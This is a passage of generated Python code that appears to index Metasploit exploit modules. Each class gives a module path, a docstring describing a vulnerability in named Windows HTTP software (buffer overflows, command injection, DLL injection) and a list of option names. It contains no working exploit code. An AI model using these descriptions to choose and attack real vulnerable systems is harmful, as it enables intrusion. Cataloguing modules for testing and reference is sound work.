			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_badblue_ext_overflow(object):
		"""
		
        This is a stack buffer overflow exploit for BadBlue version 2.5.
      
		"""

		path = 'windows/http/badblue_ext_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_efs_easychatserver_username(object):
		"""
		
          This module exploits a stack buffer overflow in EFS Software Easy Chat
        Server versions 2.0 to 3.1. By sending an overly long authentication
        request, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/efs_easychatserver_username'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_savant_31_overflow(object):
		"""
		
          This module exploits a stack buffer overflow in Savant 3.1 Web Server. The service
        supports a maximum of 10 threads (for a default install). Each exploit attempt
        generally causes a thread to die whether sucessful or not. Therefore, in a default
        configuration, you only have 10 chances.

        Due to the limited space available for the payload in this exploit module, use of the
        "ord" payloads is recommended.
      
		"""

		path = 'windows/http/savant_31_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_ektron_xslt_exec(object):
		"""
		
          This module exploits a vulnerability in Ektron CMS 8.02 (before SP5). The
        vulnerability exists due to the insecure usage of XslCompiledTransform, using a
        XSLT controlled by the user. The module has been tested successfully on Ektron CMS
        8.02 over Windows 2003 SP2, which allows to execute arbitrary code with NETWORK
        SERVICE privileges.
      
		"""

		path = 'windows/http/ektron_xslt_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_HTTP_DELAY = 'HTTP_DELAY'
			required_TARGETURI = 'TARGETURI'

	class windows_http_psoproxy91_overflow(object):
		"""
		
        This module exploits a buffer overflow in the PSO Proxy v0.91 web server.
        If a client sends an excessively long string the stack is overwritten.
      
		"""

		path = 'windows/http/psoproxy91_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_disk_pulse_enterprise_bof(object):
		"""
		
        This module exploits a stack buffer overflow in Disk Pulse Enterprise
        9.0.34. If a malicious user sends a malicious HTTP login request,
        it is possible to execute a payload that would run under the Windows
        NT AUTHORITY/SYSTEM account. Due to size constraints, this module
        uses the Egghunter technique.
      
		"""

		path = 'windows/http/disk_pulse_enterprise_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_nnm_ovbuildpath_textfile(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node
        Manager 7.53 prior to NNM_01213 without the SSRT100649 hotfix. By specifying a long
        'textFile' argument when calling the 'webappmon.exe' CGI program, an attacker can
        cause a stack-based buffer overflow and execute arbitrary code.

        The vulnerable code is within the "_OVBuildPath" function within "ov.dll". There
        are no stack cookies, so exploitation is achieved by overwriting the saved return
        address.

        The vulnerability is due to the use of the function "_OVConcatPath" which finally
        uses "strcat" in a insecure way. User controlled data is concatenated to a string
        which contains the OpenView installation path.

        To achieve reliable exploitation a directory traversal in OpenView5.exe
        (OSVDB 44359) is being used to retrieve OpenView logs and disclose the installation
        path. If the installation path cannot be guessed the default installation path
        is used.
      
		"""

		path = 'windows/http/hp_nnm_ovbuildpath_textfile'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_oracle_endeca_exec(object):
		"""
		
        This module exploits a command injection vulnerability on the Oracle Endeca
        Server 7.4.0. The vulnerability exists on the createDataStore method from the
        controlSoapBinding web service. The vulnerable method only exists on the 7.4.0
        branch and isn't available on the 7.5.5.1 branch. In addition, the injection
        has been found to be Windows specific. This module has been tested successfully
        on Endeca Server 7.4.0.787 over Windows 2008 R2 (64 bits).
      
		"""

		path = 'windows/http/oracle_endeca_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_TARGETURI = 'TARGETURI'

	class windows_http_generic_http_dll_injection(object):
		"""
		
        This is a general-purpose module for exploiting conditions where a HTTP request
        triggers a DLL load from an specified SMB share. This module serves payloads as
        DLLs over an SMB service and allows an arbitrary HTTP URL to be called that would
        trigger the load of the DLL.
      
		"""

		path = 'windows/http/generic_http_dll_injection'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FILE_NAME = 'FILE_NAME'
			FOLDER_NAME = 'FOLDER_NAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_TARGETURI = 'TARGETURI'
			required_SMB_DELAY = 'SMB_DELAY'

	class windows_http_oracle_beehive_evaluation(object):
		"""
		
        This module exploits a vulnerability found in Oracle BeeHive. The processEvaluation method
        found in voice-servlet can be abused to write a malicious file onto the target machine, and
        gain remote arbitrary code execution under the context of SYSTEM.
      
		"""

		path = 'windows/http/oracle_beehive_evaluation'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'

	class windows_http_sambar6_search_results(object):
		"""
		
      This module exploits a buffer overflow found in the
      /search/results.stm application that comes with Sambar 6.
      This code is a direct port of Andrew Griffiths's SMUDGE
      exploit, the only changes made were to the nops and payload.
      This exploit causes the service to die, whether you provided
      the correct target or not.
      
		"""

		path = 'windows/http/sambar6_search_results'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_rabidhamster_r4_log(object):
		"""
		
          This module exploits a vulnerability found in RabidHamster R4's web server.
        By supplying a malformed HTTP request, it is possible to trigger a stack-based
        buffer overflow when generating a log, which may result in arbitrary code
        execution under the context of the user.
      
		"""

		path = 'windows/http/rabidhamster_r4_log'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
